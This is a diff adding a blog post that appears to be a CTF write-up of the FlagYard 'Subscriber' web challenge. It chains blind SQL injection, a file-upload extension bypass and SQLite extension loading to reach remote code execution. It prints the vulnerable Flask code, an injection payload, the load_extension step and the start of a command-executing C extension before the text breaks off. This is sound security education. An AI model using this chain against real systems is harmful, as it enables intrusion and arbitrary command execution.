@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Subscriber – [Web] (Hard) - FlagYard | m7eesn blog</title>
+<meta name="title" content="Subscriber – [Web] (Hard) - FlagYard" />
+<meta name="description" content="Special thanks to #!SudoSqu!!d for the SQLite extension loading tip!
+1. Challenge Overview
+Challenge Description
+
+Join the l33ts and subscribe to our innocent shop.
+
+Subscriber is a web challenge from FlagYard featuring a Flask application with a deceptive vulnerability chain. The application offers email subscription and feedback submission functionality. At first glance, input validation and security controls appear to be in place, but multiple weaknesses combine to allow Remote Code Execution (RCE)." />
+<meta name="keywords" content="" />
+
+
+<meta property="og:url" content="https://blog.looter.dev/blog/2025-11-01-flagyard-subscriber-web-challenge/">
+  <meta property="og:site_name" content="m7eesn blog">
+  <meta property="og:title" content="Subscriber – [Web] (Hard) - FlagYard">
+  <meta property="og:description" content="Special thanks to #!SudoSqu!!d for the SQLite extension loading tip!
+1. Challenge Overview Challenge Description Join the l33ts and subscribe to our innocent shop.
+Subscriber is a web challenge from FlagYard featuring a Flask application with a deceptive vulnerability chain. The application offers email subscription and feedback submission functionality. At first glance, input validation and security controls appear to be in place, but multiple weaknesses combine to allow Remote Code Execution (RCE).">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-11-01T01:00:00+00:00">
+    <meta property="article:modified_time" content="2025-11-01T01:00:00+00:00">
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Subscriber – [Web] (Hard) - FlagYard">
+  <meta name="twitter:description" content="Special thanks to #!SudoSqu!!d for the SQLite extension loading tip!
+1. Challenge Overview Challenge Description Join the l33ts and subscribe to our innocent shop.
+Subscriber is a web challenge from FlagYard featuring a Flask application with a deceptive vulnerability chain. The application offers email subscription and feedback submission functionality. At first glance, input validation and security controls appear to be in place, but multiple weaknesses combine to allow Remote Code Execution (RCE).">
+
+
+
+
+  <meta itemprop="name" content="Subscriber – [Web] (Hard) - FlagYard">
+  <meta itemprop="description" content="Special thanks to #!SudoSqu!!d for the SQLite extension loading tip!
+1. Challenge Overview Challenge Description Join the l33ts and subscribe to our innocent shop.
+Subscriber is a web challenge from FlagYard featuring a Flask application with a deceptive vulnerability chain. The application offers email subscription and feedback submission functionality. At first glance, input validation and security controls appear to be in place, but multiple weaknesses combine to allow Remote Code Execution (RCE).">
+  <meta itemprop="datePublished" content="2025-11-01T01:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-11-01T01:00:00+00:00">
+  <meta itemprop="wordCount" content="1455">
+  <meta itemprop="keywords" content="Ctf,Writeup,Flagyard">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+    --width: 720px;
+    --font-main: Verdana, sans-serif;
+    --font-secondary: Verdana, sans-serif;
+    --font-scale: 1em;
+    --background-color: #fff;
+    --heading-color: #222;
+    --text-color: #444;
+    --link-color: #3273dc;
+    --visited-color: #8b6fcb;
+    --blockquote-color: #222;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --background-color: #01242e;
+      --heading-color: #eee;
+      --text-color: #ddd;
+      --link-color: #8cc2dd;
+      --visited-color: #8b6fcb;
+      --blockquote-color: #ccc;
+    }
+  }
+
+  body {
+    font-family: var(--font-secondary);
+    font-size: var(--font-scale);
+    margin: auto;
+    padding: 20px;
+    max-width: var(--width);
+    text-align: left;
+    background-color: var(--background-color);
+    word-wrap: break-word;
+    overflow-wrap: break-word;
+    line-height: 1.5;
+    color: var(--text-color);
+  }
+
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    font-family: var(--font-main);
+    color: var(--heading-color);
+  }
+
+  a {
+    color: var(--link-color);
+    cursor: pointer;
+    text-decoration: none;
+  }
+
+  a:hover {
+    text-decoration: underline;
+  }
+
+  nav a {
+    margin-right: 8px;
+  }
+
+  strong,
+  b {
+    color: var(--heading-color);
+  }
+
+  button {
+    margin: 0;
+    cursor: pointer;
+  }
+
+  time {
+    font-family: monospace;
+    font-style: normal;
+    font-size: 15px;
+  }
+
+  main {
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+  }
+
+  hr {
+    border: 0;
+    border-top: 1px dashed;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  code {
+    font-family: monospace;
+    padding: 2px;
+    border-radius: 3px;
+  }
+
+  blockquote {
+    border-left: 1px solid #999;
+    color: var(--blockquote-color);
+    padding-left: 20px;
+    font-style: italic;
+  }
+
+  footer {
+    padding: 25px 0;
+    text-align: center;
+  }
+
+  .title:hover {
+    text-decoration: none;
+  }
+
+  .title h1 {
+    font-size: 1.5em;
+  }
+
+  .inline {
+    width: auto !important;
+  }
+
+  .highlight,
+  .code {
+    border-radius: 3px;
+    margin-block-start: 1em;
+    margin-block-end: 1em;
+    overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+    list-style-type: none;
+    padding: unset;
+  }
+
+  ul.blog-posts li {
+    display: flex;
+  }
+
+  ul.blog-posts li span {
+    flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+    color: var(--visited-color);
+  }
+
+</style>
+<style>
+  code {
+    padding: 4px 8px !important;
+    margin: 0 4px !important;
+    background-color: rgba(0, 0, 0, 0.05);
+  }
+
+   
+  div.highlight {
+    background-color: rgba(15, 1, 1, 0.801);
+    border-radius: 3px;
+  }
+
+  div.highlight pre {
+    padding: 1em !important;
+    margin: 0 !important;
+    background-color: transparent !important;
+    display: inline-block;
+    min-width: 100%;
+  }
+
+  div.highlight code {
+    padding: 0 !important;
+    margin: 0 !important;
+    background-color: transparent !important;
+    display: inline-block;
+    min-width: 100%;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    code {
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+
+    div.highlight {
+      background-color: rgba(0, 0, 0, 0.3);
+    }
+  }
+</style></head>
+
+<body>
+  <header><a href="https://blog.looter.dev/" class="title">
+  <h2>m7eesn blog</h2>
+</a>
+<nav>
+</nav>
+</header>
+  <main>
+
+<h1>Subscriber – [Web] (Hard) - FlagYard</h1>
+<p>
+  <i>
+    <time datetime='2025-11-01'>
+      01 Nov, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <p>Special thanks to <strong>#!SudoSqu!!d</strong> for the SQLite extension loading tip!</p>
+<h2 id="1-challenge-overview">1. Challenge Overview</h2>
+<h3 id="challenge-description">Challenge Description</h3>
+<blockquote>
+<p><em>Join the l33ts and subscribe to our innocent shop.</em></p>
+</blockquote>
+<p>Subscriber is a web challenge from FlagYard featuring a Flask application with a deceptive vulnerability chain. The application offers email subscription and feedback submission functionality. At first glance, input validation and security controls appear to be in place, but multiple weaknesses combine to allow Remote Code Execution (RCE).</p>
+<p><strong>Challenge Details:</strong></p>
+<ul>
+<li><strong>Category:</strong> Web</li>
+<li><strong>Difficulty:</strong> Hard</li>
+<li><strong>Download:</strong> <a href="https://blog.looter.dev/downloads/flagyard-subscriber.zip">download link</a></li>
+<li><strong>Note:</strong> Source code is exfiltrated (not provided with challenge)</li>
+</ul>
+<h3 id="key-findings">Key Findings</h3>
+<p>The vulnerability chain exploits:</p>
+<ol>
+<li><strong>Blind Boolean SQL Injection</strong> in the subscription endpoint</li>
+<li><strong>File Upload Bypass</strong> through extension filtering logic</li>
+<li><strong>SQLite Extension Loading</strong> for achieving RCE</li>
+<li><strong>Custom SQL Functions</strong> for command execution</li>
+</ol>
+<hr>
+<h2 id="2-challenge-architecture">2. Challenge Architecture</h2>
+<p>The Flask application exposes three main endpoints:</p>
+<ul>
+<li><strong><code>/</code></strong> ,  Home page</li>
+<li><strong><code>/subscribe</code></strong> ,  Email subscription form (POST)</li>
+<li><strong><code>/feedback</code></strong> ,  Feedback file upload form (POST)</li>
+</ul>
+<p>The backend uses SQLite as its database with <code>conn.enable_load_extension(True)</code> explicitly enabled, a critical security oversight.</p>
+<hr>
+<h2 id="3-reconnaissance">3. Reconnaissance</h2>
+<h3 id="database-enumeration">Database Enumeration</h3>
+<p>Using blind boolean SQL injection on the <code>updates_freq</code> parameter, we identified:</p>
+<ul>
+<li><strong>Framework:</strong> Flask</li>
+<li><strong>Database:</strong> SQLite</li>
+<li><strong>Injection Point:</strong> <code>updates_freq</code> parameter in <code>/subscribe</code> endpoint</li>
+</ul>
+<h3 id="database-schema-discovery">Database Schema Discovery</h3>
+<p><strong>Tables found:</strong></p>
+<ol>
+<li>
+<p><strong><code>feedback</code></strong> table ,  Stores feedback submissions</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+-------+----------+-------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> id <span style="color:#f92672">|</span> title <span style="color:#f92672">|</span> filename <span style="color:#f92672">|</span> description <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+-------+----------+-------------+
+</span></span></span></code></pre></div></li>
+<li>
+<p><strong><code>subscribers</code></strong> table ,  Email subscriber records</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+-------+------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> id <span style="color:#f92672">|</span> email <span style="color:#f92672">|</span> update_frequency <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+-------+------------------+
+</span></span></span></code></pre></div></li>
+<li>
+<p><strong><code>updates_freq</code></strong> table ,  Valid frequency options (reference data)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+----------+--------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> id <span style="color:#f92672">|</span> freq     <span style="color:#f92672">|</span> <span style="color:#66d9ef">option</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+----------+--------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>  <span style="color:#f92672">|</span> Daily    <span style="color:#f92672">|</span> <span style="color:#ae81ff">0</span>      <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">2</span>  <span style="color:#f92672">|</span> Weekly   <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>      <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">3</span>  <span style="color:#f92672">|</span> Monthly  <span style="color:#f92672">|</span> <span style="color:#ae81ff">2</span>      <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">4</span>  <span style="color:#f92672">|</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">-</span>Months <span style="color:#f92672">|</span> <span style="color:#ae81ff">3</span>      <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>  <span style="color:#f92672">|</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">-</span>Months <span style="color:#f92672">|</span> <span style="color:#ae81ff">4</span>      <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">6</span>  <span style="color:#f92672">|</span> <span style="color:#ae81ff">9</span><span style="color:#f92672">-</span>Months <span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>      <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>  <span style="color:#f92672">|</span> Yearly   <span style="color:#f92672">|</span> <span style="color:#ae81ff">6</span>      <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----+----------+--------+
+</span></span></span></code></pre></div></li>
+</ol>
+<hr>
+<h2 id="4-source-code-analysis">4. Source Code Analysis</h2>
+<p>The source code (was exfiltrated after owning the challenge) reveals multiple critical vulnerabilities in <code>app.py</code>:</p>
+<h3 id="vulnerability-1-sql-injection-in-subscribe-endpoint">Vulnerability #1: SQL Injection in <code>/subscribe</code> Endpoint</h3>
+<p><strong>Location:</strong> <code>app.py</code>, line 105</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/subscribe&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">subscribe</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            email <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;email&#39;</span>]
+</span></span><span style="display:flex;"><span>            update_option <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;updates_freq&#39;</span>]
+</span></span><span style="display:flex;"><span>            conn <span style="color:#f92672">=</span> sqlite3<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#39;site.db&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># !! Extensions enabled!</span>
+</span></span><span style="display:flex;"><span>            conn<span style="color:#f92672">.</span>enable_load_extension(<span style="color:#66d9ef">True</span>) 
+</span></span><span style="display:flex;"><span>            cursor <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>cursor()
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># !! String interpolation without sanitization</span>
+</span></span><span style="display:flex;"><span>            cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;SELECT freq FROM updates_freq WHERE option = &#39;</span><span style="color:#e6db74">{</span>update_option<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
+</span></span><span style="display:flex;"><span>            update_frequency <span style="color:#f92672">=</span> cursor<span style="color:#f92672">.</span>fetchone()
+</span></span><span style="display:flex;"><span>            conn<span style="color:#f92672">.</span>commit()
+</span></span><span style="display:flex;"><span>            conn<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> update_frequency <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Invalid update frequency option.&#39;</span>, <span style="color:#e6db74">&#39;status&#39;</span>: <span style="color:#e6db74">&#39;warning&#39;</span>}
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;You have successfully subscribed!&#39;</span>, <span style="color:#e6db74">&#39;status&#39;</span>: <span style="color:#e6db74">&#39;success&#39;</span>}
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify(result), <span style="color:#ae81ff">200</span>
+</span></span></code></pre></div><p><strong>Critical Issues:</strong></p>
+<ol>
+<li><strong>Line 103:</strong> <code>conn.enable_load_extension(True)</code> explicitly enables SQLite extension loading, the foundation of the RCE exploit</li>
+<li><strong>Line 105:</strong> Direct f-string interpolation creates a blind boolean SQL injection vulnerability</li>
+<li><strong>Design Flaw:</strong> The code never actually inserts records into the <code>subscribers</code> table, it only validates the frequency option</li>
+</ol>
+<h3 id="vulnerability-2-file-upload-bypass-in-feedback-endpoint">Vulnerability #2: File Upload Bypass in <code>/feedback</code> Endpoint</h3>
+<p><strong>Location:</strong> <code>app.py</code>, lines 125-157</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/feedback&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">feedback</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            title <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;title&#39;</span>]
+</span></span><span style="display:flex;"><span>            description <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;description&#39;</span>]
+</span></span><span style="display:flex;"><span>            file <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
+</span></span><span style="display:flex;"><span>            filename <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> file:
+</span></span><span style="display:flex;"><span>                filename <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>filename
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># !! File saved BEFORE validation!</span>
+</span></span><span style="display:flex;"><span>                file<span style="color:#f92672">.</span>save(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;UPLOAD_FOLDER&#39;</span>],
+</span></span><span style="display:flex;"><span>                         filename<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;..&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)))
+</span></span><span style="display:flex;"><span>                filtered_filename <span style="color:#f92672">=</span> filter_filename(filename)
+</span></span><span style="display:flex;"><span>                mime_type <span style="color:#f92672">=</span> get_mime(file)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> filtered_filename:
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># File already on disk at this point!</span>
+</span></span><span style="display:flex;"><span>                    os<span style="color:#f92672">.</span>remove(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;UPLOAD_FOLDER&#39;</span>],
+</span></span><span style="display:flex;"><span>                             filename<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;..&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)))
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;File type not allowed...&#39;</span>}), <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;File Uploaded successfully&#39;</span>}), <span style="color:#ae81ff">200</span>
+</span></span></code></pre></div><p><strong>Extension Filtering Logic (Lines 59-66):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filter_filename</span>(filename):
+</span></span><span style="display:flex;"><span>    file_ext <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>splitext(filename)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># !! Removes dots but preserves original extension</span>
+</span></span><span style="display:flex;"><span>    filename <span style="color:#f92672">=</span> filename<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;/&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>    filename <span style="color:#f92672">+=</span> file_ext
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> is_allowed_file(file_ext):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> filename
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_allowed_file</span>(file_ext):
+</span></span><span style="display:flex;"><span>    allowed_extensions <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;.jpeg&#39;</span>, <span style="color:#e6db74">&#39;.jpg&#39;</span>, <span style="color:#e6db74">&#39;.png&#39;</span>, <span style="color:#e6db74">&#39;.pdf&#39;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> file_ext <span style="color:#f92672">in</span> allowed_extensions
+</span></span></code></pre></div><p><strong>Extension Bypass Technique:</strong>
+The filter only checks the file extension (<code>.jpg</code>, <code>.png</code>, etc.), not the actual file contents:</p>
+<ul>
+<li>Upload a compiled SQLite extension as <code>shell.so</code> with filename <code>shell.jpg</code></li>
+<li>The file saves to <code>./uploads/shell.jpg</code> with binary <code>.so</code> contents</li>
+<li>SQLite&rsquo;s <code>load_extension()</code> ignores file extensions and directly loads the shared object</li>
+<li>Result: <code>load_extension('./uploads/shell.jpg')</code> successfully loads malicious code</li>
+</ul>
+<h2 id="5-vulnerability-deep-dive">5. Vulnerability Deep Dive</h2>
+<h3 id="blind-boolean-sql-injection">Blind Boolean SQL Injection</h3>
+<p>The <code>/subscribe</code> endpoint accepts a POST request with <code>email</code> and <code>updates_freq</code> parameters. The <code>updates_freq</code> value is directly interpolated into a SQL query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;SELECT freq FROM updates_freq WHERE option = &#39;</span><span style="color:#e6db74">{</span>update_option<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
+</span></span></code></pre></div><p><strong>Attack Vector:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#39; AND &lt;condition&gt; -- -&#34;</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;email&#39;</span>: <span style="color:#e6db74">&#39;test@test.com&#39;</span>, <span style="color:#e6db74">&#39;updates_freq&#39;</span>: payload}
+</span></span></code></pre></div><p>This becomes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> freq <span style="color:#66d9ef">FROM</span> updates_freq <span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">option</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#f92672">&lt;</span>condition<span style="color:#f92672">&gt;</span> <span style="color:#75715e">-- -&#39;
+</span></span></span></code></pre></div><p>The <code>--</code> comment syntax removes the trailing quote, allowing us to inject boolean conditions. Response times or other side channels can confirm true/false results for blind exploitation.</p>
+<h3 id="sqlite-extension-loading-mechanism">SQLite Extension Loading Mechanism</h3>
+<p>SQLite supports loading shared libraries that contain custom SQL functions. This is enabled when an application calls:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">sqlite3_enable_load_extension</span>(db, <span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p>Python&rsquo;s sqlite3 module exposes this via:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>enable_load_extension(<span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;SELECT load_extension(&#39;./path/to/extension.so&#39;)&#34;</span>)
+</span></span></code></pre></div><p>When a <code>.so</code> (shared object) is loaded, the SQLite library calls its initialization function (<code>sqlite3_extension_init</code>), which can register new SQL functions with arbitrary code execution.</p>
+<hr>
+<h2 id="6-exploitation-strategy">6. Exploitation Strategy</h2>
+<p>The complete RCE exploit proceeds in three phases:</p>
+<ol>
+<li>Create a malicious SQLite extension (C code compiled to <code>.so</code>)</li>
+<li>Upload the extension via the <code>/feedback</code> endpoint (disguised as <code>.jpg</code>)</li>
+<li>Use SQL injection in <code>/subscribe</code> to load and initialize the extension</li>
+<li>Invoke the custom SQL function to execute arbitrary system commands</li>
+<li>Extract the flag from the command output</li>
+</ol>
+<hr>
+<h2 id="7-building-the-malicious-sqlite-extension">7. Building the Malicious SQLite Extension</h2>
+<p><strong>File:</strong> <code>shell_extension.c</code></p>
+<p>The SQLite extension defines a custom SQL function called <code>execute()</code> that runs arbitrary system commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sqlite3.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sqlite3ext.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stddef.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>SQLITE_EXTENSION_INIT1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Custom SQL function: execute(command_string)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">executeCommand</span>(sqlite3_context <span style="color:#f92672">*</span>context, <span style="color:#66d9ef">int</span> argc, sqlite3_value <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sqlite3_result_error</span>(context, <span style="color:#e6db74">&#34;Invalid number of arguments&#34;</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
